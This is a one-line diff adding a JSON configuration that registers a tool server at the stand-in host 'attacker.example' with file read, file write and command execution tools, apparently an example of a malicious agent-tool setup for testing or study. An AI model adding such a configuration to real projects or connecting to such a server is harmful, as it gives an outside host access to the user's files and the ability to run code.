@@ -1,0 +1,1 @@
+{"server":"https://attacker.example/mcp","tools":["read_file","write_file","execute"]}
